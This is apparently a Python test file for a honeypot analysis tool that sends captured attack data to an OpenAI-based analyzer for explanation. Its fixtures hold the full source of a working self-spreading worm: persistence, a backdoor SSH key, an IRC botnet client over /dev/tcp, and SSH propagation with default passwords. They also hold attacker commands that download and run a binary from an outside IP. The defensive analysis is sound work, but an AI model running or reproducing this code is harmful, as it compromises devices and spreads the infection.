from analyzerbase import *

from netanalyzers.ipanalyzer import IPAnalyzer
from loganalyzers.cowrieloganalyzer import CowrieLogAnalyzer, Attack
from openaianalyzers.openaianalyzer import OpenAIAnalyzer, OPENAI_API_KEY


class TestOpenAIAnalyzer(TestCase):
    
    @classmethod
    def setUpClass(cls):
        cls.analyzer = OpenAIAnalyzer()
        cls.test_malware_source_code = 'C0755 4745 X\n#!/bin/bash\n\nMYSELF=`realpath $0`\nDEBUG=/dev/null\necho $MYSELF >> $DEBUG\n\nif [ "$EUID" -ne 0 ]\nthen \n\tNEWMYSELF=`mktemp -u \'XXXXXXXX\'`\n\tsudo cp $MYSELF /opt/$NEWMYSELF\n\tsudo sh -c "echo \'#!/bin/sh -e\' > /etc/rc.local"\n\tsudo sh -c "echo /opt/$NEWMYSELF >> /etc/rc.local"\n\tsudo sh -c "echo \'exit 0\' >> /etc/rc.local"\n\tsleep 1\n\tsudo reboot\nelse\nTMP1=`mktemp`\necho $TMP1 >> $DEBUG\n\nkillall bins.sh\nkillall minerd\nkillall node\nkillall nodejs\nkillall ktx-armv4l\nkillall ktx-i586\nkillall ktx-m68k\nkillall ktx-mips\nkillall ktx-mipsel\nkillall ktx-powerpc\nkillall ktx-sh4\nkillall ktx-sparc\nkillall arm5\nkillall zmap\nkillall kaiten\nkillall perl\n\necho "127.0.0.1 bins.deutschland-zahlung.eu" >> /etc/hosts\nrm -rf /root/.bashrc\nrm -rf /home/pi/.bashrc\n\nusermod -p \\$6\\$vGkGPKUr\\$heqvOhUzvbQ66Nb0JGCijh/81sG1WACcZgzPn8A0Wn58hHXWqy5yOgTlYJEbOjhkHD0MRsAkfJgjU/ioCYDeR1 pi\n\nmkdir -p /root/.ssh\necho "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D6s4J0L7XV2kep0rNzgY1S1IdE8HDef7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B"  >> /root/.ssh/authorized_keys\n\necho "nameserver 8.8.8.8" >> /etc/resolv.conf\nrm -rf /tmp/ktx*\nrm -rf /tmp/cpuminer-multi\nrm -rf /var/tmp/kaiten\n\ncat > /tmp/public.pem <<EOFMARKER\n-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC/ihTe2DLmG9huBi9DsCJ90MJs\nglv7y530TWw2UqNtKjPPA1QXvNsWdiLpTzyvk8mv6ObWBF8hHzvyhJGCadl0v3HW\nrXneU1DK+7iLRnkI4PRYYbdfwp92nRza00JUR7P4pghG5SnRK+R/579vIiy+1oAF\nWRq+Z8HYMvPlgSRA3wIDAQAB\n-----END PUBLIC KEY-----\nEOFMARKER\n\nBOT=`mktemp -u \'XXXXXXXX\'`\n\ncat > /tmp/$BOT <<\'EOFMARKER\'\n#!/bin/bash\n\nSYS=`uname -a | md5sum | awk -F\' \' \'{print $1}\'`\nNICK=a${SYS:24}\nwhile [ true ]; do\n\n\tarr[0]="ix1.undernet.org"\n\tarr[1]="ix2.undernet.org"\n\tarr[2]="Ashburn.Va.Us.UnderNet.org"\n\tarr[3]="Bucharest.RO.EU.Undernet.Org"\n\tarr[4]="Budapest.HU.EU.UnderNet.org"\n\tarr[5]="Chicago.IL.US.Undernet.org"\n\trand=$[$RANDOM % 6]\n\tsvr=${arr[$rand]}\n\n\teval \'exec 3<>/dev/tcp/$svr/6667;\'\n\tif [[ ! "$?" -eq 0 ]] ; then\n\t\t\tcontinue\n\tfi\n\n\techo $NICK\n\n\teval \'printf "NICK $NICK\\r\\n" >&3;\'\n\tif [[ ! "$?" -eq 0 ]] ; then\n\t\t\tcontinue\n\tfi\n\teval \'printf "USER user 8 * :IRC hi\\r\\n" >&3;\'\n\tif [[ ! "$?" -eq 0 ]] ; then\n\t\tcontinue\n\tfi\n\n\t# Main loop\n\twhile [ true ]; do\n\t\teval "read msg_in <&3;"\n\n\t\tif [[ ! "$?" -eq 0 ]] ; then\n\t\t\tbreak\n\t\tfi\n\n\t\tif  [[ "$msg_in" =~ "PING" ]] ; then\n\t\t\tprintf "PONG %s\\n" "${msg_in:5}";\n\t\t\teval \'printf "PONG %s\\r\\n" "${msg_in:5}" >&3;\'\n\t\t\tif [[ ! "$?" -eq 0 ]] ; then\n\t\t\t\tbreak\n\t\t\tfi\n\t\t\tsleep 1\n\t\t\teval \'printf "JOIN #biret\\r\\n" >&3;\'\n\t\t\tif [[ ! "$?" -eq 0 ]] ; then\n\t\t\t\tbreak\n\t\t\tfi\n\t\telif [[ "$msg_in" =~ "PRIVMSG" ]] ; then\n\t\t\tprivmsg_h=$(echo $msg_in| cut -d\':\' -f 3)\n\t\t\tprivmsg_data=$(echo $msg_in| cut -d\':\' -f 4)\n\t\t\tprivmsg_nick=$(echo $msg_in| cut -d\':\' -f 2 | cut -d\'!\' -f 1)\n\n\t\t\thash=`echo $privmsg_data | base64 -d -i | md5sum | awk -F\' \' \'{print $1}\'`\n\t\t\tsign=`echo $privmsg_h | base64 -d -i | openssl rsautl -verify -inkey /tmp/public.pem -pubin`\n\n\t\t\tif [[ "$sign" == "$hash" ]] ; then\n\t\t\t\tCMD=`echo $privmsg_data | base64 -d -i`\n\t\t\t\tRES=`bash -c "$CMD" | base64 -w 0`\n\t\t\t\teval \'printf "PRIVMSG $privmsg_nick :$RES\\r\\n" >&3;\'\n\t\t\t\tif [[ ! "$?" -eq 0 ]] ; then\n\t\t\t\t\tbreak\n\t\t\t\tfi\n\t\t\tfi\n\t\tfi\n\tdone\ndone\nEOFMARKER\n\nchmod +x /tmp/$BOT\nnohup /tmp/$BOT 2>&1 > /tmp/bot.log &\nrm /tmp/nohup.log -rf\nrm -rf nohup.out\nsleep 3\nrm -rf /tmp/$BOT\n\nNAME=`mktemp -u \'XXXXXXXX\'`\n\ndate > /tmp/.s\n\napt-get update -y --force-yes\napt-get install zmap sshpass -y --force-yes\n\nwhile [ true ]; do\n\tFILE=`mktemp`\n\tzmap -p 22 -o $FILE -n 100000\n\tkillall ssh scp\n\tfor IP in `cat $FILE`\n\tdo\n\t\tsshpass -praspberry scp -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no $MYSELF pi@$IP:/tmp/$NAME  && echo $IP >> /opt/.r && sshpass -praspberry ssh pi@$IP -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no "cd /tmp && chmod +x $NAME && bash -c ./$NAME" &\n\t\tsshpass -praspberryraspberry993311 scp -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no $MYSELF pi@$IP:/tmp/$NAME  && echo $IP >> /opt/.r && sshpass -praspberryraspberry993311 ssh pi@$IP -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no "cd /tmp && chmod +x $NAME && bash -c ./$NAME" &\n\tdone\n\trm -rf $FILE\n\tsleep 10\ndone\n\nfi\n\n\n'
        cls.test_cmds = ['scp -t /tmp/50kmIX7P', 'cd /tmp && chmod +x 50kmIX7P && bash -c ./50kmIX7P', './50kmIX7P']

            

    def test_explain_commands(self):
        cmds = ['echo 1 && cat /bin/echo', 
                'nohup $SHELL -c "curl http://94.230.232.6:60142/linux -o /tmp/f1HcUi057v', 
                'if [ ! -f /tmp/f1HcUi057v ]; then wget http://94.230.232.6:60142/linux -O /tmp/f1HcUi057v; fi;', 
                "if [ ! -f /tmp/f1HcUi057v ]; then exec 6<>/dev/tcp/94.230.232.6/60142 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/f1HcUi057v && chmod +x /tmp/f1HcUi057v && /tmp/f1HcUi057v TBxkRntvhxAYm3d4WGcOPDcKZUd8d5UQGZtwcEV7DTgjBG1MfnGEERKVeHxYZw89Iw5mRGZ3jxcRhHV6VmYSPD0Ne0d9dZsYFI93eEdlBC08DmBYf3ibEBGDb3lCbwo9PA9lVnl3gQ8Yh29/TnsNOjUGY0Z5c40BEIFwZkdhBCM8CWRYcHuDERCFcmhOYBI8NAR7T2ZwhBQbg3F5RmMcNSMNZkZmdIAPFYR7fkZkDT4tDWRPZniDDxCFcWZHbA83OwxkQnFhhBkUm3N8Q3sIPCMOZURyd4UQEIdhekdsEjw5CXtHe3KbFBCPd3hHZgstPAVmWHlwhw8Vh295RW8KPTwPbVZ5cYMPEIFvekJtEjw9BmNGeXWGARSMb3lHZRI/PhJnRH57gxEQgXhoRWMSOiMNYkdmc4QbF4Vwe0F1DTUjDmdHZnCDFA+EeXxMYww8OQx1Qn9vjBUPhHVmR2QNNzsMZEd/YYEUD4d1cFhkDCM/DmRMfnGEERCVcHBEewo8Iw5iWH13jxcRhHB8VmQNPCMOZ09mcoUPE4F3ckBlDT87HGRYeXCCDxiGb3pCZwY7PQ1nTmhwhRcPgHJmQWcSNDgGY0Z5cIMBEIR5ZkVkEjw8CntEfXOPFxGEcHpWYQ4jPAVnWHpxjQ8ThHhyQGUNPD4cZE57b4cVF5twcE97Cz83CmVHeHCVEBiFb35Hew85Iw1jQ3J3hRASgWF5RmYSPDgPe0dwdZsTFY93eEdnDi08DGRYenGFDxSMb3lDYQY7PQ1nT2hyjA8QhXBmR2MOIzwFbEx+cYQSGMBUyjosBY0HJjhEZEyfaM3RwQ==; fi;", 'echo 123456 > /tmp/.opass', 
                'chmod +x /tmp/f1HcUi057v && /tmp/f1HcUi057v TBxkRntvhxAYm3d4WGcOPDcKZUd8d5UQGZtwcEV7DTgjBG1MfnGEERKVeHxYZw89Iw5mRGZ3jxcRhHV6VmYSPD0Ne0d9dZsYFI93eEdlBC08DmBYf3ibEBGDb3lCbwo9PA9lVnl3gQ8Yh29/TnsNOjUGY0Z5c40BEIFwZkdhBCM8CWRYcHuDERCFcmhOYBI8NAR7T2ZwhBQbg3F5RmMcNSMNZkZmdIAPFYR7fkZkDT4tDWRPZniDDxCFcWZHbA83OwxkQnFhhBkUm3N8Q3sIPCMOZURyd4UQEIdhekdsEjw5CXtHe3KbFBCPd3hHZgstPAVmWHlwhw8Vh295RW8KPTwPbVZ5cYMPEIFvekJtEjw9BmNGeXWGARSMb3lHZRI/PhJnRH57gxEQgXhoRWMSOiMNYkdmc4QbF4Vwe0F1DTUjDmdHZnCDFA+EeXxMYww8OQx1Qn9vjBUPhHVmR2QNNzsMZEd/YYEUD4d1cFhkDCM/DmRMfnGEERCVcHBEewo8Iw5iWH13jxcRhHB8VmQNPCMOZ09mcoUPE4F3ckBlDT87HGRYeXCCDxiGb3pCZwY7PQ1nTmhwhRcPgHJmQWcSNDgGY0Z5cIMBEIR5ZkVkEjw8CntEfXOPFxGEcHpWYQ4jPAVnWHpxjQ8ThHhyQGUNPD4cZE57b4cVF5twcE97Cz83CmVHeHCVEBiFb35Hew85Iw1jQ3J3hRASgWF5RmYSPDgPe0dwdZsTFY93eEdnDi08DGRYenGFDxSMb3lDYQY7PQ1nT2hyjA8QhXBmR2MOIzwFbEx+cYQSGMBUyjosBY0HJjhEZEyfaM3RwQ==" &', 'head -c 0 > /tmp/X23ZoPo761', 'chmod 777 /tmp/X23ZoPo761', '/tmp/X23ZoPo761 TBxkRntvhxAYm3d4WGcOPDcKZUd8d5UQGZtwcEV7DTgjBG1MfnGEERKVeHxYZw89Iw5mRGZ3jxcRhHV6VmYSPD0Ne0d9dZsYFI93eEdlBC08DmBYf3ibEBGDb3lCbwo9PA9lVnl3gQ8Yh29/TnsNOjUGY0Z5c40BEIFwZkdhBCM8CWRYcHuDERCFcmhOYBI8NAR7T2ZwhBQbg3F5RmMcNSMNZkZmdIAPFYR7fkZkDT4tDWRPZniDDxCFcWZHbA83OwxkQnFhhBkUm3N8Q3sIPCMOZURyd4UQEIdhekdsEjw5CXtHe3KbFBCPd3hHZgstPAVmWHlwhw8Vh295RW8KPTwPbVZ5cYMPEIFvekJtEjw9BmNGeXWGARSMb3lHZRI/PhJnRH57gxEQgXhoRWMSOiMNYkdmc4QbF4Vwe0F1DTUjDmdHZnCDFA+EeXxMYww8OQx1Qn9vjBUPhHVmR2QNNzsMZEd/YYEUD4d1cFhkDCM/DmRMfnGEERCVcHBEewo8Iw5iWH13jxcRhHB8VmQNPCMOZ09mcoUPE4F3ckBlDT87HGRYeXCCDxiGb3pCZwY7PQ1nTmhwhRcPgHJmQWcSNDgGY0Z5cIMBEIR5ZkVkEjw8CntEfXOPFxGEcHpWYQ4jPAVnWHpxjQ8ThHhyQGUNPD4cZE57b4cVF5twcE97Cz83CmVHeHCVEBiFb35Hew85Iw1jQ3J3hRASgWF5RmYSPDgPe0dwdZsTFY93eEdnDi08DGRYenGFDxSMb3lDYQY7PQ1nT2hyjA8QhXBmR2MOIzwFbEx+cYQSGMBUyjosBY0HJjhEZEyfaM3RwQ==', 
                'cp /tmp/X23ZoPo761 /tmp/linux',
                'head -c 0 > /tmp/windows',
                'head -c 0 > /tmp/windows_sign',
                'head -c 0 > /tmp/arm_linux',
                'head -c 0 > /tmp/mips_linux',
                'head -c 0 > /tmp/mips_linux_sign',
                'head -c 0 > /tmp/winminer',
                'head -c 0 > /tmp/arm_linux_sign',
                'head -c 0 > /tmp/winminer_sign',
                'head -c 0 > /tmp/miner_sign',
                'head -c 0 > /tmp/miner',
                'head -c 0 > /tmp/mipsel_linux',
                'head -c 0 > /tmp/mipsel_linux_sign',
                'head -c 0 > /tmp/linux_sign',
                'exit'
            ]
        
        result = self.analyzer.explain_commands(cmds)
        print(result)


    def test_explain_malware(self):
        
        result = self.analyzer.explain_malware(self.test_malware_source_code, self.test_cmds)
        
        print(result)

    def test_comment_malware(self):
        
        result = self.analyzer.comment_malware(self.test_malware_source_code, self.test_cmds)
        
        print(result)

    def test_answer_questions(self):
        
        result = self.analyzer.answer_attack_questions(questions=["What is the goal of this attack?",],
                                        commands=self.test_cmds,
                                        malware_source_code=self.test_malware_source_code)
        
        print(result)